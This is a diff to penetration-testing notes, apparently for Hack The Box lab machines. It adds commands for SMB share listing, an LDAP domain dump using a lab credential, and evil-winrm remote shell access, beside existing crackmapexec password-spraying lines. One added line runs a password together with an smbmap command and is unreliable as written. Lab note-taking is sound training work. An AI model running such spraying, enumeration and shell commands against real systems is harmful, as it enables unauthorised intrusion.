@@ -16,7 +16,21 @@ crackmapexec winrm 10.129.42.197 -u user.list -p password.list
 crackmapexec --verbose smb 10.129.42.197 -u "user" -p "password" --shares
 ```
 
+#### SMB enumeration
+list shares
+```bash
+netexec smb 10.129.128.107  -u michael.wrightson -p Cicada$M6Corpb*@Lp#nZpsmbmap -H 10.129.128.107 --shares
+```
+
+#### LDAP
+Dump everything (domains/users/etc)
+```bash
+ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.129.128.107 -o dump
+```
+
 #### Evil-WinRM
+#shell [[bind shell]]
+to log in and get the shell:
 ```
 sudo gem install evil-winrm
 evil-winrm -i 10.129.42.197 -u user -p password
